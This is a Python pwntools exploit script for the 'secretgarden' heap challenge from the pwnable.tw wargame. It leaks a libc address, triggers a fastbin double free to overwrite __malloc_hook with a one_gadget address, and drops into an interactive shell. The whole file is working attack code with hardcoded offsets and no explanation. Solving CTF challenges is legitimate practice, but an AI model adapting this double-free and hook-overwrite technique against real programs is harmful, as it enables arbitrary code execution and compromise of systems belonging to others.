from pwn import *


def raise_flowername(option, length, name, color):
	if(option==1):
		s.recvuntil("choice : ")
		s.send("1\n")
		s.recv(1024)
		s.send(str(length)+"\n")
		s.recvuntil("flower :")
		s.send(name)
		s.recvuntil("flower :")
		s.send(color+"\n")
	elif(option==2):
		s.recvuntil("choice : ")
		s.send("1")
		s.recv(1024)
		s.send(str(length)+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n")
		s.recvuntil("flower :")
		s.send(name)
		s.recvuntil("flower :")
		s.send(color+"\n")

	else:
		s.send("1\n")
		s.recv(1024)
		s.send(str(length)+"\n")
		s.recvuntil("flower :")
		s.send(name)
		s.recvuntil("flower :")
		s.send(color+"\n")
def remove_flower(option, index):
	if(option):
		s.recvuntil("choice : ")
		s.send("3\n")
		s.recv(1024)
		s.send(str(index)+"\n")
def visit_garden(option):
	if(option==1):	
		s.recvuntil("choice : ")
		s.send("2\n")
		a=u64((s.recvuntil("choice : ")[0x56:0x5c])+"\x00\x00")
		return a
	else:
		s.recvuntil("choice : ")
		s.send("2\n")
		print(hexdump(s.recvuntil("choice : ")))
def clear_garden():
	s.recvuntil("choice : ")
	s.send("4\n")
#s=process("./secretgarden")
s=process("./secretgarden", env={"LD_PRELOAD":"./libc_64.so.6"})
#s=remote("chall.pwnable.tw",10203)
raise_flowername(1,130, "aaa","bbb")
raise_flowername(1,40, "aaa","bbb")
remove_flower(1,0)
raise_flowername(1,80, "aaaaaaaa","bbb")
libc_leak=visit_garden(1)
#pause()
#one_gadget=libc_leak-0x7f9b45390b78+0x7f9b45011390-0x45390+0x45216
#malloc_hook=libc_leak-0x7f9b45390b78+0x7f9b45011390-0x45390+0x3c4b10
one_gadget=libc_leak-0x7fc72027bb78+0x7fc71fefd390-0x45390+0xef6c4
malloc_hook=libc_leak-0x7fc72027bb78+0x7fc71fefd390-0x45390+0x3c3b10
print(hex(libc_leak))
print(hex(one_gadget))
print(hex(malloc_hook))
raise_flowername(0,0x60,"ccc","ddd")
raise_flowername(1,0x60,"ccc","ddd")
raise_flowername(1,0x60,"ccc","ddd")
remove_flower(1,4)
remove_flower(1,5)
remove_flower(1,4)


raise_flowername(1,0x60,p64(malloc_hook-35),"eee")
raise_flowername(1,0x60,"fff","ggg")
pause()
raise_flowername(2,0x60,"hhh","iii")
raise_flowername(1,0x60, "a"*19+p64(one_gadget), "jjj")

pause()

#remove_flower(1,2)
#remove_flower(1,3)
#remove_flower(1,6)
#remove_flower(1,7)
#remove_flower(1,8)

#raise_flowername(1,10,"kkk","lll")
s.interactive()

s.close()
